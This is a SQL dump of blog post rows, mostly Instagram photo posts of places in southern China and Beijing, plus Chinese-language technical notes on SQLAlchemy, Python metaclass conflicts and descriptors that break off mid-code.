(55, 'https://blog.tonyseek.com/post/silent-hill-hong-kong-museum-of-art/', '香港藝術館', '<p>Silent Hill (在 Hong Kong Museum of Art 香港藝術館)</p>\n<a class="reference external image-reference" href="https://instagram.com/p/XZY1WRvUC5/"><img alt="Silent Hill (在 Hong Kong Museum of Art 香港藝術館)" src="https://instagram.com/p/XZY1WRvUC5/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2013-03-28 09:47:00', '2013-03-28 09:47:00', 0, '[["Hong", 1.4943459378625], ["Art", 1.4943459378625], ["Silent", 1.4943459378625], ["\\u85dd\\u8853\\u9928", 1.4943459378625], ["Museum", 1.4943459378625], ["Kong", 1.4943459378625], ["Hill", 1.4943459378625], ["\\u9999\\u6e2f", 0.7265144808375]]', NULL, NULL, 'Silent Hill (在 Hong Kong Museum of Art 香港藝術館)\n', NULL, NULL, NULL),
(56, 'https://blog.tonyseek.com/post/the-museum-of-the-nanyue-king/', '西汉南越王博物馆', '<p>安卓… (在 西汉南越王博物馆 - The Museum of The Nanyue King Mausoleum)</p>\n<a class="reference external image-reference" href="https://instagram.com/p/XOxAMRPUAQ/"><img alt="安卓… (在 西汉南越王博物馆 - The Museum of The Nanyue King Mausoleum)" src="https://instagram.com/p/XOxAMRPUAQ/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2013-03-24 06:53:00', '2013-03-24 06:53:00', 0, '[["King", 1.4943459378625], ["Museum", 1.4943459378625], ["Nanyue", 1.4943459378625], ["\\u5b89\\u5353", 1.4943459378625], ["Mausoleum", 1.4943459378625], ["\\u5357\\u8d8a\\u738b", 1.3403279777], ["\\u897f\\u6c49", 0.8895275736675], ["\\u535a\\u7269\\u9986", 0.87386554629125]]', NULL, NULL, '安卓… (在 西汉南越王博物馆 - The Museum of The Nanyue King Mausoleum)\n', NULL, NULL, NULL),
(57, 'https://blog.tonyseek.com/post/five-goats-statue/', '五羊雕塑', '<p>五羊 (在 五羊雕塑 Five Goats Statue)</p>\n<a class="reference external image-reference" href="https://instagram.com/p/XOjTiYvUEW/"><img alt="五羊 (在 五羊雕塑  Five Goats Statue)" src="https://instagram.com/p/XOjTiYvUEW/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2013-03-24 04:47:00', '2013-03-24 04:47:00', 0, '[["\\u4e94\\u7f8a", 4.0363060609], ["Five", 1.9924612504833332], ["Goats", 1.9924612504833332], ["Statue", 1.9924612504833332], ["\\u96d5\\u5851", 1.3650417724333332]]', NULL, NULL, '五羊 (在 五羊雕塑 Five Goats Statue)\n', NULL, NULL, NULL),
(58, 'https://blog.tonyseek.com/post/bombax-ceiba-in-szu/', '木棉花 (深大文科楼)', '<a class="reference external image-reference" href="https://instagram.com/p/WOzoP6vUL3/"><img alt="木棉花 (在 深大文科楼)" src="https://instagram.com/p/WOzoP6vUL3/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2013-02-27 10:38:00', '2013-02-27 10:38:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(59, 'https://blog.tonyseek.com/post/trap-myself/', '挖坑者联盟（一）', '<p>用动态语言编写一些简单的应用时，好的 ORM 往往能带来开发效率的提升 —— 尽管 ORM 为不少大型项目所不齿。Python 社区的 ORM 框架最著名的莫属 SQLAlchemy，它的特点是利用 Python 的元编程支持构造了一套既能照顾到面向对象开发习惯，又能向下支持复杂数据库查询操作的 DSL。这类框架在分类上，应该属于抽象层。</p>\n\n<p>抽象层的一个问题，就是在应用本身的业务复杂度之外又增加了额外的“抽象复杂度”，加上去的复杂度是要花费开发者额外精力去理解的。我在使用 SQLAlchemy 的过程中，也因为对这层附加上去的复杂度理解不深，掉了许多次坑。掉坑的次数多了，我慢慢有点感觉有些“危险的路径”坑是比较多的，有些安全的路径是比较太平的。这种感觉还不成体系，暂时先写这么一篇博客记录下来，希望日后的开发学习中再求理解。</p>\n<div class="section" id="sqlalchemy">\n<h2>SQLAlchemy 的使用方式</h2>\n<p>SQLAlchemy 曾经的使用方式比较繁琐，需要自己定义 <tt class="docutils literal">Engine</tt> （数据访问层）、 <tt class="docutils literal">Metadata</tt> （数据库 Schema 定义）、 <tt class="docutils literal">Table</tt> （表结构定义）、 <tt class="docutils literal">Mapper</tt> （映射规则），然后用 <tt class="docutils literal">Mapper</tt> 将 <tt class="docutils literal">Metadata</tt> 映射到目标模型类中。需要使用模型类的时候，建立 <tt class="docutils literal">Session</tt> （数据库访问会话）并用业务方法修改模型数据，然后提交会话，SQLAlchemy 的控制流一层层往回走，数据的前后变动被 <tt class="docutils literal">Session</tt> 内部的[工作单元][0]析出，经过 <tt class="docutils literal">Metadata</tt> 整理成查询 DSL，再由 <tt class="docutils literal">Engine</tt> 转换成本地数据库驱动支持的 SQL 方言。</p>\n<p>后来大概是被反复吐槽这样太麻烦了吧，SQLAlchemy 开发组就在新版本中支持了一种稍微简洁一些的用法，即用定义类的方式定义表的结构。通过描述符、元类等元编程手段，SQLAlchemy 自动生成上述构建。有了这一机制，SQLAlchemy 用起来就和 Django Model 很像了，如下。</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">szulabs.extensions</span> <span class="kn">import</span> <span class="n">db</span><span class="p">,</span> <span class="n">bcrypt</span>\n\n<span class="k">class</span> <span class="nc">UserAccount</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Model</span><span class="p">):</span>\n    <span class="n">user_id</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Integer</span><span class="p">,</span> <span class="n">primary_key</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>\n    <span class="n">email</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span> <span class="n">unique</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">index</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>\n    <span class="n">nickname</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Unicode</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span> <span class="n">unique</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>\n    <span class="n">hashed_password</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">60</span><span class="p">))</span>\n\n    <span class="k">def</span> <span class="nf">change_password</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">new_password</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">hashed_password</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">generate_password_hash</span><span class="p">(</span><span class="n">new_password</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>\n\n    <span class="k">def</span> <span class="nf">check_password</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">input_value</span><span class="p">):</span>\n        <span class="k">return</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">check_password_hash</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">hashed_password</span><span class="p">,</span> <span class="n">input_value</span><span class="p">)</span>\n</pre></div>\n</figure><p>因为 Python 中元类有“在类的定义完成后执行某个操作”的功效，所以继承 <tt class="docutils literal">db.Model</tt> 的 <tt class="docutils literal">UserAccount</tt> 会在类的定义完成后生成 <tt class="docutils literal">user_account</tt> 这个 <tt class="docutils literal">Table</tt> 和对应的 <tt class="docutils literal">Mapper</tt> 。</p>\n<p>于是，这就是悲剧的开始。</p>\n</div>\n<div class="section" id="python">\n<h2>Python 元类的蛋疼点</h2>\n<p>Python 中元类（Meta Class）是“类的类”，它定义了一个类的创建过程。可以把类看成实例，那么此时的这个实例的类就是元类。当然这个定义不会无线循环下去，因为元类也是类，所以元类的类还是元类。</p>\n<p>利用元类可以实现一些非常强大的特性，比如在一个类被创建之后，立即将它注册到一个注册表中去，用元类的实现如下。</p>\n<figure class="code"><div class="highlight"><pre><span class="n">classes_register</span> <span class="o">=</span> <span class="p">{}</span>\n\n<span class="k">class</span> <span class="nc">SpamType</span><span class="p">(</span><span class="nb">type</span><span class="p">):</span>\n    <span class="k">def</span> <span class="nf">__new__</span><span class="p">(</span><span class="n">meta</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">bases</span><span class="p">,</span> <span class="n">members</span><span class="p">):</span>\n        <span class="n">cls</span> <span class="o">=</span> <span class="nb">type</span><span class="o">.</span><span class="n">__new__</span><span class="p">(</span><span class="n">meta</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">bases</span><span class="p">,</span> <span class="n">members</span><span class="p">)</span>\n        <span class="n">classes_register</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">cls</span>  <span class="c"># here</span>\n        <span class="k">return</span> <span class="n">cls</span>\n\n<span class="k">class</span> <span class="nc">Spam</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n    <span class="n">__metaclass__</span> <span class="o">=</span> <span class="n">SpamType</span>\n\n<span class="k">assert</span> <span class="s">&quot;Spam&quot;</span> <span class="ow">in</span> <span class="n">classes_register</span>\n<span class="k">assert</span> <span class="n">classes_register</span><span class="p">[</span><span class="s">&quot;Spam&quot;</span><span class="p">]</span> <span class="ow">is</span> <span class="n">Spam</span>\n</pre></div>\n</figure><p>SQLAlchemy 的新式用法就是利用元类的这一特性来工作的。甚至在定义 <tt class="docutils literal">Column</tt> 的时候都不用为其传入字段名，预设的元类会将这个 <tt class="docutils literal">Column</tt> 实例在类中的属性名（通过访问元类的 <tt class="docutils literal">members</tt> 参数取得）作为其默认名字。这样许多“约定大于配置”的预设，让开发者确实方便了很多。</p>\n<p>但元类有一个很大的蛋疼点，就是它对类的扩充是基于**继承**而非**组合**来实现的。</p>\n<p>Python 的对象模型不支持 Ruby 风格的 mixin，但支持 Ruby 不支持的多重继承。于是多重继承常常被作为 Python 中实现 mixin 的一种手段。这种 mixin 实现在语义上体现为继承，逻辑上的含义却是组合。因为 mixin 的模块多数是职责独立的 partial class，类与类之间互不获知互不重叠，因此多重继承设计中陷阱重重的 MRO 查找顺序问题、钻石继承问题，在这种设计中都不会出现。但若想结合元类来使用基于多重继承的 mixin，那简直就是做梦。设想上述的 <tt class="docutils literal">UserAccount</tt> 模型类，如果需要继承两三个 mixin 类来实现扩展功能，而这两三个 mixin 类都有各自的元类，那么最终 <tt class="docutils literal">UserAccount</tt> 如何保证这两三个不同的元类都能正常工作呢？实际情况是，Python 会直接将这种继承视为错误。</p>\n<figure class="code"><div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="k">class</span> <span class="nc">Meta1</span><span class="p">(</span><span class="nb">type</span><span class="p">):</span> <span class="k">pass</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="k">class</span> <span class="nc">Meta2</span><span class="p">(</span><span class="nb">type</span><span class="p">):</span> <span class="k">pass</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="k">class</span> <span class="nc">PartialA</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n<span class="o">...</span>     <span class="n">__metaclass__</span> <span class="o">=</span> <span class="n">Meta1</span>\n<span class="o">...</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="k">class</span> <span class="nc">PartialB</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n<span class="o">...</span>     <span class="n">__metaclass__</span> <span class="o">=</span> <span class="n">Meta2</span>\n<span class="o">...</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="k">class</span> <span class="nc">Base</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span> <span class="k">pass</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="k">class</span> <span class="nc">UserAccount</span><span class="p">(</span><span class="n">Base</span><span class="p">,</span> <span class="n">PartialA</span><span class="p">,</span> <span class="n">PartialB</span><span class="p">):</span> <span class="k">pass</span>\n<span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>\n  <span class="n">File</span> <span class="s">&quot;&lt;input&gt;&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>\n<span class="ne">TypeError</span><span class="p">:</span> <span class="n">Error</span> <span class="n">when</span> <span class="n">calling</span> <span class="n">the</span> <span class="n">metaclass</span> <span class="n">bases</span>\n    <span class="n">metaclass</span> <span class="n">conflict</span><span class="p">:</span> <span class="n">the</span> <span class="n">metaclass</span> <span class="n">of</span> <span class="n">a</span> <span class="n">derived</span> <span class="k">class</span> <span class="nc">must</span> <span class="n">be</span> <span class="n">a</span> <span class="p">(</span><span class="n">non</span><span class="o">-</span><span class="n">strict</span><span class="p">)</span> <span class="n">subclass</span> <span class="n">of</span> <span class="n">the</span> <span class="n">metaclasses</span> <span class="n">of</span> <span class="nb">all</span> <span class="n">its</span> <span class="n">bases</span>\n</pre></div>\n</figure><p>事实上 Python 除了告诉开发者 “metaclass conflict”，别的根本无能为力。当遇到多个基类携带了多个不同的元类时，Python 最多只能让其中一个可以工作，因为元类是基于继承而非基于组合的。虽然逻辑上可以让多个 mixin 模块使用同一个元类，然后让这个元类用 hook 的方式分调 mixin 各自的代码，但实际开发中多个 mixin 可能来自多个不同的模块，对元类的修改牵一发而动全身。</p>\n<p>（未完）</p>\n<table class="docutils footnote" frame="void" id="id2" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label">[0]</td><td><a class="reference external" href="http://martinfowler.com/eaaCatalog/unitOfWork.html">Unit of Work</a></td></tr>\n</tbody>\n</table>\n</div>', '2014-11-06 23:43:08', 6, '2013-02-04 19:58:00', '2013-02-04 19:58:00', 0, '[["\\u5143\\u7c7b", 0.27325182863771424], ["class", 0.18786063218842855], ["db", 0.18786063218842855], ["mixin", 0.1707823928985714], ["Python", 0.1707823928985714], ["__", 0.15370415360871426], ["SQLAlchemy", 0.15370415360871426], ["password", 0.15370415360871426], ["metaclass", 0.11954767502899999], ["\\u7ee7\\u627f", 0.1037600043769143], ["\\u5b9a\\u4e49", 0.10276879021957144], ["Column", 0.10246943573914284], ["UserAccount", 0.0853911964492857], ["\\u590d\\u6742\\u5ea6", 0.06831295715942856], ["pass", 0.06831295715942856], ["True", 0.06831295715942856], ["type", 0.06831295715942856], ["register", 0.06831295715942856], ["classes", 0.06831295715942856], ["Spam", 0.06831295715942856]]', NULL, NULL, '用动态语言编写一些简单的应用时，好的 ORM 往往能带来开发效率的提升 —— 尽管 ORM 为不少大型项目所不齿。Python 社区的 ORM 框架最著名的莫属 SQLAlchemy，它的特点是利用 Python 的元编程支持构造了一套既能照顾到面向对象开发习惯，又能向下支持复杂数据库查询操作的 DSL。这类框架在分类上，应该属于抽象层。\n\n抽象层的一个问题，就是在应用本身的业务复杂度之外又增加了额外的“抽象复杂度”，加上去的复杂度是要花费开发者额外精力去理解的。我在使用 SQLAlchemy 的过程中，也因为对这层附加上去的复杂度理解不深，掉了许多次坑。掉坑的次数多了，我慢慢有点感觉有些“危险的路径”坑是比较多的，有些安全的路径是比较太平的。这种感觉还不成体系，暂时先写这么一篇博客记录下来，希望日后的开发学习中再求理解。\n\nSQLAlchemy 的使用方式\nSQLAlchemy 曾经的使用方式比较繁琐，需要自己定义 Engine （数据访问层）、 Metadata （数据库 Schema 定义）、 Table （表结构定义）、 Mapper （映射规则），然后用 Mapper 将 Metadata 映射到目标模型类中。需要使用模型类的时候，建立 Session （数据库访问会话）并用业务方法修改模型数据，然后提交会话，SQLAlchemy 的控制流一层层往回走，数据的前后变动被 Session 内部的[工作单元][0]析出，经过 Metadata 整理成查询 DSL，再由 Engine 转换成本地数据库驱动支持的 SQL 方言。\n后来大概是被反复吐槽这样太麻烦了吧，SQLAlchemy 开发组就在新版本中支持了一种稍微简洁一些的用法，即用定义类的方式定义表的结构。通过描述符、元类等元编程手段，SQLAlchemy 自动生成上述构建。有了这一机制，SQLAlchemy 用起来就和 Django Model 很像了，如下。\nfrom szulabs.extensions import db, bcrypt\n\nclass UserAccount(db.Model):\n    user_id = db.Column(db.Integer, primary_key=True)\n    email = db.Column(db.String(255), unique=True, index=True)\n    nickname = db.Column(db.Unicode(20), unique=True)\n    hashed_password = db.Column(db.String(60))\n\n    def change_password(self, new_password):\n        self.hashed_password = bcrypt.generate_password_hash(new_password, 10)\n\n    def check_password(self, input_value):\n        return bcrypt.check_password_hash(self.hashed_password, input_value)\n\n因为 Python 中元类有“在类的定义完成后执行某个操作”的功效，所以继承 db.Model 的 UserAccount 会在类的定义完成后生成 user_account 这个 Table 和对应的 Mapper 。\n于是，这就是悲剧的开始。\n\n\nPython 元类的蛋疼点\nPython 中元类（Meta Class）是“类的类”，它定义了一个类的创建过程。可以把类看成实例，那么此时的这个实例的类就是元类。当然这个定义不会无线循环下去，因为元类也是类，所以元类的类还是元类。\n利用元类可以实现一些非常强大的特性，比如在一个类被创建之后，立即将它注册到一个注册表中去，用元类的实现如下。\nclasses_register = {}\n\nclass SpamType(type):\n    def __new__(meta, name, bases, members):\n        cls = type.__new__(meta, name, bases, members)\n        classes_register[name] = cls  # here\n        return cls\n\nclass Spam(object):\n    __metaclass__ = SpamType\n\nassert "Spam" in classes_register\nassert classes_register["Spam"] is Spam\n\nSQLAlchemy 的新式用法就是利用元类的这一特性来工作的。甚至在定义 Column 的时候都不用为其传入字段名，预设的元类会将这个 Column 实例在类中的属性名（通过访问元类的 members 参数取得）作为其默认名字。这样许多“约定大于配置”的预设，让开发者确实方便了很多。\n但元类有一个很大的蛋疼点，就是它对类的扩充是基于**继承**而非**组合**来实现的。\nPython 的对象模型不支持 Ruby 风格的 mixin，但支持 Ruby 不支持的多重继承。于是多重继承常常被作为 Python 中实现 mixin 的一种手段。这种 mixin 实现在语义上体现为继承，逻辑上的含义却是组合。因为 mixin 的模块多数是职责独立的 partial class，类与类之间互不获知互不重叠，因此多重继承设计中陷阱重重的 MRO 查找顺序问题、钻石继承问题，在这种设计中都不会出现。但若想结合元类来使用基于多重继承的 mixin，那简直就是做梦。设想上述的 UserAccount 模型类，如果需要继承两三个 mixin 类来实现扩展功能，而这两三个 mixin 类都有各自的元类，那么最终 UserAccount 如何保证这两三个不同的元类都能正常工作呢？实际情况是，Python 会直接将这种继承视为错误。\n>>> class Meta1(type): pass\n>>> class Meta2(type): pass\n>>> class PartialA(object):\n...     __metaclass__ = Meta1\n...\n>>> class PartialB(object):\n...     __metaclass__ = Meta2\n...\n>>> class Base(object): pass\n>>> class UserAccount(Base, PartialA, PartialB): pass\nTraceback (most recent call last):\n  File "<input>", line 1, in <module>\nTypeError: Error when calling the metaclass bases\n    metaclass conflict: the metaclass of a derived class must be a (non-strict) subclass of the metaclasses of all its bases\n\n事实上 Python 除了告诉开发者 “metaclass conflict”，别的根本无能为力。当遇到多个基类携带了多个不同的元类时，Python 最多只能让其中一个可以工作，因为元类是基于继承而非基于组合的。虽然逻辑上可以让多个 mixin 模块使用同一个元类，然后让这个元类用 hook 的方式分调 mixin 各自的代码，但实际开发中多个 mixin 可能来自多个不同的模块，对元类的修改牵一发而动全身。\n（未完）\n\n\n\n[0]Unit of Work\n\n\n', NULL, NULL, NULL),
(60, 'https://blog.tonyseek.com/post/silent-hill-szu/', 'Welcome to Silent Hill (深圳大学)', '<a class="reference external image-reference" href="https://instagram.com/p/SkVNcpPUI3/"><img alt="Welcome to Silent Hill (at 深圳大学 | Shenzhen University)" src="https://instagram.com/p/SkVNcpPUI3/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-11-28 09:10:00', '2012-11-28 09:10:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(61, 'https://blog.tonyseek.com/post/woods-of-deep-bay/', '林 (红树林海滨公园)', '<a class="reference external image-reference" href="https://instagram.com/p/SZnUgUvUKT/"><img alt="林 (at 红树林海滨公园)" src="https://instagram.com/p/SZnUgUvUKT/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-11-24 05:17:00', '2012-11-24 05:17:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(62, 'https://blog.tonyseek.com/post/grassland-of-deep-bay/', '草坪 (红树林海滨公园)', '<a class="reference external image-reference" href="https://instagram.com/p/SZlwU2PUI_/"><img alt="草坪 (at 红树林海滨公园)" src="https://instagram.com/p/SZlwU2PUI_/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-11-24 05:05:00', '2012-11-24 05:05:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(63, 'https://blog.tonyseek.com/post/sea-of-deep-bay/', '海 (红树林海滨公园)', '<a class="reference external image-reference" href="https://instagram.com/p/SZl-NCPUJL/"><img alt="海？ (at 红树林海滨公园)" src="https://instagram.com/p/SZl-NCPUJL/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-11-24 05:05:00', '2012-11-24 05:05:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(64, 'https://blog.tonyseek.com/post/red-tree-of-szu/', '回来了 (深大西门)', '<a class="reference external image-reference" href="https://instagram.com/p/SES7wsvUBq/"><img alt="回来了 (at 深大西门)" src="https://instagram.com/p/SES7wsvUBq/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-11-15 22:35:00', '2012-11-15 22:35:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(65, 'https://blog.tonyseek.com/post/cotton-of-hometown/', '棉花 (洲上王村)', '<a class="reference external image-reference" href="https://instagram.com/p/SAMhIKvUBy/"><img alt="棉花 (at 洲上王村)" src="https://instagram.com/p/SAMhIKvUBy/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-11-14 08:21:00', '2012-11-14 08:21:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(66, 'https://blog.tonyseek.com/post/field-of-hometown/', '田 (洲上王村)', '<a class="reference external image-reference" href="https://instagram.com/p/SAMJBvPUBs/"><img alt="田 (at 洲上王村)" src="https://instagram.com/p/SAMJBvPUBs/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-11-14 08:18:00', '2012-11-14 08:18:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(67, 'https://blog.tonyseek.com/post/gate-of-hometown/', '聂桥·王村 (洲上王村)', '<a class="reference external image-reference" href="https://instagram.com/p/SAIOrgPUA-/"><img alt="聂桥·王村 (at 洲上王村)" src="https://instagram.com/p/SAIOrgPUA-/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-11-14 07:46:00', '2012-11-14 07:46:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(68, 'https://blog.tonyseek.com/post/openshift-paas-pycon-2012/', 'OpenShift PaaS', '<a class="reference external image-reference" href="https://instagram.com/p/RNlS55PULm/"><img alt="OpenShift PaaS" src="https://instagram.com/p/RNlS55PULm/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-10-25 16:36:00', '2012-10-25 16:36:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(69, 'https://blog.tonyseek.com/post/old-summer-palace/', '圆明园遗址', '<a class="reference external image-reference" href="https://instagram.com/p/QZjAY3vUFp/"><img alt="使用 Instagram 拍摄于 圆明园遗址" src="https://instagram.com/p/QZjAY3vUFp/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-10-05 11:36:00', '2012-10-05 11:36:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(70, 'https://blog.tonyseek.com/post/the-back-view-of-dog/', '背影 (798 电机总厂青旅)', '<a class="reference external image-reference" href="https://instagram.com/p/PpGDRaPUNT/"><img alt="背影 Instagram 拍摄于 798 电机总厂青旅)" src="https://instagram.com/p/PpGDRaPUNT/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-09-16 16:00:00', '2012-09-16 16:00:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(71, 'https://blog.tonyseek.com/post/toy-of-lollypain/', '小疼同学的希德 (Douban Office 豆瓣)', '<a class="reference external image-reference" href="https://instagram.com/p/Pm94REvUME/"><img alt="小疼同学的希德 Instagram 拍摄于 Douban Office 豆瓣)" src="https://instagram.com/p/Pm94REvUME/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-09-15 20:12:00', '2012-09-15 20:12:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(72, 'https://blog.tonyseek.com/post/night-of-dpark/', '夜·798·路灯 (D-Park)', '<a class="reference external image-reference" href="https://instagram.com/p/Pj-NgdvUNP/"><img alt="夜·798·路灯 (使用 Instagram 拍摄于 D-Park)" src="https://instagram.com/p/Pj-NgdvUNP/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-09-14 16:15:00', '2012-09-14 16:15:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(73, 'https://blog.tonyseek.com/post/empty-place-of-douban/', '空空的楼下 (豆瓣 Douban Inc.)', '<a class="reference external image-reference" href="https://instagram.com/p/PiiZ8uPUGw/"><img alt="空空的楼下 (使用 Instagram 拍摄于 豆瓣 Douban Inc.)" src="https://instagram.com/p/PiiZ8uPUGw/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-09-14 02:53:00', '2012-09-14 02:53:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(74, 'https://blog.tonyseek.com/post/moon-and-798/', '今晚的月亮好亮 (798 电机总厂青旅)', '<a class="reference external image-reference" href="https://instagram.com/p/PFCd6-vUHj/"><img alt="今晚的月亮好亮 (使用 Instagram 拍摄于 798 电机总厂青旅)" src="https://instagram.com/p/PFCd6-vUHj/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-09-02 15:55:00', '2012-09-02 15:55:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(75, 'https://blog.tonyseek.com/post/purple-horse/', '潜伏在一楼角落的紫色小马', '<a class="reference external image-reference" href="https://instagram.com/p/PBcNNCPUEl/"><img alt="潜伏在一楼角落的紫色小马 (使用Instagram 拍摄)" src="https://instagram.com/p/PBcNNCPUEl/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-09-01 06:23:00', '2012-09-01 06:23:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(76, 'https://blog.tonyseek.com/post/c-area-of-douban/', '这周一搬到了一楼 (豆瓣 Douban Inc.)', '<a class="reference external image-reference" href="https://instagram.com/p/O8-seqvUP8/"><img alt="这周一搬到了一楼 (使用 Instagram 拍摄于 豆瓣 Douban Inc.)" src="https://instagram.com/p/O8-seqvUP8/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-08-30 12:49:00', '2012-08-30 12:49:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(77, 'https://blog.tonyseek.com/post/night-of-b-area-in-douban/', '深夜 - B 区 (使用Instagram 拍摄于 豆瓣)', '<a class="reference external image-reference" href="https://instagram.com/p/N6wvDVvUB0/"><img alt="深夜 - B 区 (使用Instagram 拍摄于 豆瓣)" src="https://instagram.com/p/N6wvDVvUB0/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-08-04 19:37:00', '2012-08-04 19:37:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(78, 'https://blog.tonyseek.com/post/notes-about-python-descriptor/', 'Python 描述符(descriptor) 杂记', '<p>Python 引入的“描述符”(descriptor)语法特性真的很黄很暴力，我觉得这算是 Python 对象模型的核心成员之一。Python 语言设计的紧凑很大程度上得益于它。所以写一篇笔记文记录关于描述符我知道的一切。</p>\n\n<div class="section" id="id1">\n<h2>低层 - 纯纯的描述符</h2>\n<p>纯纯的描述符很纯，基于类中定义的 <tt class="docutils literal">__get__</tt> 、 <tt class="docutils literal">__set__</tt> 、 <tt class="docutils literal">__delete__</tt> 三个特殊的方法。实现了这三个中方法的任意一个，这个类的实例就拥有了一些特殊特性。</p>\n<p>假设现在有这么一个类 MyDescriptor，它拥有描述符的实现。把 MyDescriptor 实例化(my_descriptor)，然后将实例作为另一个类 Spam 的类属性。</p>\n<figure class="code"><div class="highlight"><pre><span class="k">class</span> <span class="nc">MyDescriptor</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n    <span class="k">def</span> <span class="nf">__get__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">subject_instance</span><span class="p">,</span> <span class="n">subject_class</span><span class="p">):</span>\n        <span class="k">return</span> <span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">subject_instance</span><span class="p">,</span> <span class="n">subject_class</span><span class="p">)</span>\n\n    <span class="k">def</span> <span class="nf">__set__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">subject_instance</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>\n        <span class="k">print</span> <span class="s">&quot;</span><span class="si">%r</span><span class="s"> </span><span class="si">%r</span><span class="s"> </span><span class="si">%r</span><span class="s">&quot;</span> <span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">subject_instance</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>\n\n<span class="n">my_descriptor</span> <span class="o">=</span> <span class="n">MyDescriptor</span><span class="p">()</span>\n\n<span class="k">class</span> 